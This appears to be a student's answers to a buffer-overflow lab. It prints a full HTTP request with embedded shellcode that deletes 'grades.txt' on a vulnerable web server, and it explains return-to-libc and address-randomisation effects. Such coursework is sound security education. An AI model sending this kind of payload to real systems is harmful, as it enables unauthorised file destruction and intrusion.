Question 1:
---------------------------------

GET %EB%1B%5E%89v%0B1%C0%88F%0A%B8%0A%00%00%00%89%F3%CD%80%B8%01%00%00%001%DB%CD%80%E8%E0%FF%FF%FFgrades.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%DC%DC%FF%FF HTTP/1.0


The first part comes from the shellcode.

The second part comes from the code of the exploit-ex.py ""x" * (retaddr - reqpath - len(shellcode))", which is to fill the code with x's until the third part.

The third part is the instruction to return to reqpath.


Question 2:
---------------------------------
No it is not removed. The stack is not executable anymore in the web server. 


Question 3:
---------------------------------
Return address: 'unlink' instruction
P: 'address of fname[0]' which is grades.txt

Question 4:
---------------------------------
The values of reqpath and ebp changes. 
The difference between "ebp - reqpath" does not change.

These changes make it harder as the code only injects at a fixed location while the address of the reqpath and ebp changes all the time.
However if the code is able to pinpoint just the location of reqpath dynamically, then it will make no difference.
